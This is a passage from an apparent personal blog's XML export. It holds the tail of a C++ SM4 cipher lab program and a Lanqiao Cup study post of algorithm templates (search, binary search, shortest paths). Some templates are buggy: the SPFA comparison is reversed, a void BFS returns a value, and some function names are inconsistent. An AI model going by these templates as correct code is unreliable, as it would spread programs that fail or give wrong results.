    return s^shift_l(s,2)^shift_l(s,10)^shift_l(s,18)^shift_l(s,24);
}

uint32_t Tchange(uint32_t s)
{
    return Lchange(Sb(s));
}

uint32_t fround(uint32_t X[4],uint32_t rk)
{
    uint32_t B=X[1]^X[2]^X[3]^rk;
    return X[0]^ L_change(Sb(B));
}

static uint32_t out1[4];

void SM4(uint32_t X[4],uint32_t rk[32])
{
    uint32_t Y[36];
    Y[0]=X[0];
    Y[1]=X[1];
    Y[2]=X[2];
    Y[3]=X[3];
    for(int i=0;i&lt;=31;i++) {
        Y[i + 4] = Y[i] ^ Tchange(Y[i + 1] ^ Y[i + 2] ^ Y[i + 3] ^ rk[i]);
    }
//    for(int i=0;i&lt;36;i++) {
//        printf("第%d轮:%x \n",i,Y[i]);
//    }
    out1[0]=Y[35];
    out1[1]=Y[34];
    out1[2]=Y[33];
    out1[3]=Y[32];
}

static uint32_t out2[4];

void sm4(uint32_t Y[4],uint32_t rk[32])
{
    uint32_t X[36];
    X[35]=Y[0];
    X[34]=Y[1];
    X[33]=Y[2];
    X[32]=Y[3];
    for(int i=31;i&gt;=0;i--)
    {
        X[i]=X[i+4]^ Tchange(X[i+3]^X[i+2]^X[i+1]^rk[i]);
    }
    out2[0]=X[0];
    out2[1]=X[1];
    out2[2]=X[2];
    out2[3]=X[3];
}
int main() {
    uint32_t ming[4]={0x01234567,0x89ABCDEF,0xFEDCBA98,0x76543210};
    cout&lt;&lt;"明文:"&lt;&lt;endl;
    for(int i=0;i&lt;4;i++)
        cout&lt;&lt;hex&lt;&lt;ming[i]&lt;&lt;" ";
    cout&lt;&lt;endl;
    uint32_t MK[4]={0x01234567,0x89ABCDEF,0xFEDCBA98,0x76543210};
    cout&lt;&lt;"密钥："&lt;&lt;endl;
    for(int i=0;i&lt;4;i++)
        cout&lt;&lt;hex&lt;&lt;MK[i]&lt;&lt;" ";
    cout&lt;&lt;endl;
    uint32_t rk[32];
    keyexpand(MK,rk);
//    cout&lt;&lt;"扩展密钥："&lt;&lt;endl;
//    for(int i=0;i&lt;32;i++)
//        cout&lt;&lt;i&lt;&lt;"轮扩展密钥"&lt;&lt;rk[i]&lt;&lt;endl;
    cout&lt;&lt;"加密结果："&lt;&lt;endl;
    SM4(ming,rk);
    for(int i=0;i&lt;4;i++)
        cout&lt;&lt;out1[i]&lt;&lt;" ";
    cout&lt;&lt;endl;
    cout&lt;&lt;"解密结果:"&lt;&lt;endl;
    sm4(out1,rk);
    for(int i=0;i&lt;4;i++)
        cout&lt;&lt;out2[i]&lt;&lt;" ";
    cout&lt;&lt;endl;
    return 0;
}
</code></pre>
]]></content>
      <tags>
        <tag>密码学实验代码集合</tag>
      </tags>
  </entry>
  <entry>
    <title>蓝桥杯</title>
    <url>/2023/04/10/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="救赎"><a href="#救赎" class="headerlink" title="救赎"></a>救赎</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="1-欧几里得辗转相除法-求解-最大公约数-最小公倍数"><a href="#1-欧几里得辗转相除法-求解-最大公约数-最小公倍数" class="headerlink" title="1.欧几里得辗转相除法 求解 最大公约数 最小公倍数"></a>1.欧几里得辗转相除法 求解 最大公约数 最小公倍数</h3><pre><code class="c++">int gcd(int a, int b){return b == 0 ? a : gcd(b, a % b);}
int lcm(int a, int b){return a / gcd(a, b) * b;}
</code></pre>
<h3 id="2-求质数"><a href="#2-求质数" class="headerlink" title="2.求质数"></a>2.求质数</h3><pre><code class="c++">/* 判断素数 */
bool isPrime(LL n) {
    for (int i = 2; i * i &lt;= n; ++i)
        if (n % i == 0)
            return false;
    return true;
}
</code></pre>
<h3 id="3-栈"><a href="#3-栈" class="headerlink" title="3.栈"></a>3.栈</h3><pre><code class="c++">#include &lt;stack&gt;
stack&lt;类型&gt; mystack;
s.empty();         //如果栈为空则返回true, 否则返回false;
s.size();          //返回栈中元素的个数
s.top();           //返回栈顶元素, 但不删除该元素
s.pop();           //弹出栈顶元素, 但不返回其值
s.push();          //将元素压入栈顶
</code></pre>
<h3 id="4-队列"><a href="#4-队列" class="headerlink" title="4.队列"></a>4.队列</h3><pre><code class="c++">#include &lt;queue&gt;
queue&lt;类型&gt; myqueue;
push() //在队尾插入一个元素
pop() //删除队列第一个元素
size() //返回队列中元素个数
empty() //如果队列空则返回true
front() //返回队列中的第一个元素
back() //返回队列中最后一个元素
</code></pre>
<h3 id="5-DFS-深度优先"><a href="#5-DFS-深度优先" class="headerlink" title="5.DFS(深度优先)"></a>5.DFS(深度优先)</h3><pre><code class="c++">int dx[4] = {0,0,-1,1};
int dy[4] = {-1,1,0,0};
int mp[N][N];//存放迷宫
int vis[N][N];//表示是否访问过，初始为flase
void DFS(int x, int y)	//x,y是坐标点的位置 
{
    if(vis[x][y] || (x==n &amp;&amp; y==n)) return; //表示已经访问过了或者到达终点,递归的出口
    vis[x][y] = true; //表示没有访问过，现在正在访问，置为访问过
    for(int i=0; i &lt; 4; i++){	//遍历四个方向，顺序依次是，上下左右
        int nx = x + dx[i];
        int ny = y + dy[i];
      //进行了合法性检验，
      //1.首先判断了该点是否越界，即是否在迷宫内  nx &gt; 0 &amp;&amp; nx &lt;= n &amp;&amp; ny &gt; 0 &amp;&amp; ny &lt;= n
      //2.然后判断是否访问过  !vis[nx][ny] 未访问过就继续
      //3.最后判断是否为路  mp[nx][ny] == '0' 为路就继续
        if(nx &gt; 0 &amp;&amp; nx &lt;= n &amp;&amp; ny &gt; 0 &amp;&amp; ny &lt;= n &amp;&amp; !vis[nx][ny] &amp;&amp; mp[nx][ny] == '0')
            dfs(nx,ny);
    } 
}
//注意!! 应该判断一下起点是否可走
</code></pre>
<h3 id="6-BFS-广度优先搜索"><a href="#6-BFS-广度优先搜索" class="headerlink" title="6.BFS(广度优先搜索)"></a>6.BFS(广度优先搜索)</h3><pre><code class="c++">int X[4]={0, 0, -1, 1};
int Y[4]={-1, 1, 0, 0};
int matrix[N][N]; //存储迷宫信息
int vis[N][N];	//存储每个状态点是否走过

struct node{
    int x;
    int y;
}Node, top;

bool judge(int xx, int yy)
{
    if(xx&lt;0||yy&lt;0||xx&gt;=N||yy&gt;=N) //注意边界
        return false;
    if(vis[xx][yy]==true||matrix[xx][yy]==0)	//下一个点走过或者为墙 0不能走，1能走
        return false;
    return true;
}


void BFS(int x, int y)
{
    queue&lt;node&gt; q;
    Node.x=x;
    Node.y=y;
    q.push(Node);	//将起点入队列
    while(!q.empty())	//队列不空就扩散
    {
        top=q.front();	//取出队首元素
        int nx=top.x;
        int ny=top.y;	//从四个方面机进行扩散
         if(nx == ex &amp;&amp; ny == ey) //找到终点
             return top;
        for(int i=0; i&lt;4; i++)
        {
            if(judge(nx+X[i], ny+Y[i])) //检查四个方向，如果有路就进队列
            {
                Node.x=nx+X[i];
                Node.y=ny+Y[i];
                q.push(Node);	
            }
        }
        ans++;	//计数器
        vis[nx][ny]=true;
        q.pop();	//表示这个点的邻接点已经全部入队列，丢弃这个点
    }
}
</code></pre>
<h3 id="7-二分模板"><a href="#7-二分模板" class="headerlink" title="7.二分模板"></a>7.二分模板</h3><pre><code class="c++">/*
    作者:FengBOOOOOOOOOOOOOOO
    二分模板返回大于x的第一个位置    
*/
#include&lt;cstdio&gt;
#include&lt;algorithm&gt;
#include&lt;cstring&gt;
#define N 1005
using namespace std;

int a[N],n,q;

int find(int l,int r,int key)//l为-1，r为数组长度
{
    while(l + 1 &lt; r)
    {
        int mid = l + r&gt;&gt;1;
        if(a[mid] &lt;= key)
        　　l = mid;
        else
        　　r = mid;
    }
    return r;//返回大于Key的第一个位置
}

int main()
{
    int k;
    scanf("%d%d",&amp;n,&amp;q);
    for(int i = 0; i &lt; n; ++i)
    　　scanf("%d",&amp;a[i]);
    for(int i = 0; i &lt; q; ++i)
    {
        scanf("%d",&amp;k);
        printf("%d\n",find(-1,n,k));
    }
} 
</code></pre>
<h2 id="最短路径问题"><a href="#最短路径问题" class="headerlink" title="最短路径问题"></a>最短路径问题</h2><h3 id="1-SPFA最短路径-类似与BFS"><a href="#1-SPFA最短路径-类似与BFS" class="headerlink" title="1.SPFA最短路径(类似与BFS)"></a>1.SPFA最短路径(类似与BFS)</h3><pre><code class="c++">#include &lt;iostream&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;algorithm&gt;
#include &lt;queue&gt;
#include &lt;vector&gt;
#define ll long long
#define inf 0x3f3f3f3f
#define pii pair&lt;int, int&gt;
const int mod = 1e9+7;
const int maxn = 2e5+7;
using namespace std;
struct node {int to,w,next;} edge[maxn];
int head[maxn], cnt;
int dis[maxn], vis[maxn];
int n, m, s, t;
struct Spfa
{
    void init()
    {
        memset(head,-1,sizeof(head));
        memset(dis,0x3f3f3f3f,sizeof(dis));
        memset(vis,0,sizeof(vis));
        cnt = 0;
    }
 
    void add(int u,int v,int w)
    {
        edge[cnt].to = v;
        edge[cnt].w = w;
        edge[cnt].next = head[u];
        head[u] = cnt ++;
    }
 
    void spfa()
    {
        dis[s] = 0; vis[s] = 1;
        queue &lt;int&gt; Q; Q.push(s);
        while(!Q.empty())
        {
            int now = Q.front();
            Q.pop(); vis[now] = 0;    //从队列中弹出now , vis[now] 标记为未访问
            for(int i = head[now]; i != -1; i = edge[i].next)
            {
                int v = edge[i].to;
                if(dis[v] &lt; dis[now] + edge[i].w)
                {
                    dis[v] = dis[now] + edge[i].w;
                    if(vis[v]) continue;    //如果访问过了(也就是 已经在队列中),就不用再push
                    vis[v] = 1; Q.push(v);
                }
            }
        }
    }
}sp;
 
int main()
{
    while(~scanf("%d%d",&amp;n,&amp;m) &amp;&amp; n+m)
    {
        sp.init();
        for(int i = 0; i &lt; m; i++)
        {
            int u, v, w;
            scanf("%d%d%d",&amp;u, &amp;v, &amp;w);
            sp.add(u, v, w);
            sp.add(v, u, w);
        }
        s = 1, t = n; //s起点，t终点
        sp.spfa();
        printf("%d\n", dis[t]);
    }
}
</code></pre>
<h3 id="2-Dijkstra"><a href="#2-Dijkstra" class="headerlink" title="2.Dijkstra"></a>2.Dijkstra</h3><pre><code class="c++">//主要思想一个大循环+两个小循环
void dijkstra(){
    int u, minx;
    book[S] = 1;
    for(int i = 0; i &lt; N; i++){
    //dist[]数组初始化，把起始结点S到i结点的距离赋值给diat[i]
        dist[i] = v[S][i];
    }

    for(int i = 0; i &lt; N; i++){//大循环
        minx = INT_MAX;
        for(int j = 0; j &lt; N; j++){//寻找没有被标记并且最短的路径，并记录此结点 
            if(!book[j] &amp;&amp; minx &gt; dist[j]){
                minx = dist[j];
                u = j;
            } 
        }
        book[u] = 1;
        for(int k = 0; k &lt; N; k++){
        //如果A到B的距离大于A到C的距离加C到B的距离，那么更新数据
            if(!book[k] &amp;&amp; dist[k] &gt; dist[u]+v[u][k]){
                dist[k] = dist[u]+v[u][k];
            }
        }
    }
}
</code></pre>
<h3 id="3-Floyd"><a href="#3-Floyd" class="headerlink" title="3.Floyd"></a>3.Floyd</h3><pre><code class="c++">//初始化：
    for (int i = 1; i &lt;= n; i ++ )
        for (int j = 1; j &lt;= n; j ++ )
            if (i == j) d[i][j] = 0;
            else d[i][j] = INF;

// 算法结束后，d[a][b]表示a到b的最短距离
void floyd()
{
    for (int k = 1; k &lt;= n; k ++ )
        for (int i = 1; i &lt;= n; i ++ )
            for (int j = 1; j &lt;= n; j ++ )
                d[i][j] = min(d[i][j], d[i][k] + d[k][j]);
}
</code></pre>
]]></content>
      <tags>
        <tag>蓝桥杯刷题总结</tag>
      </tags>
  </entry>
</search>
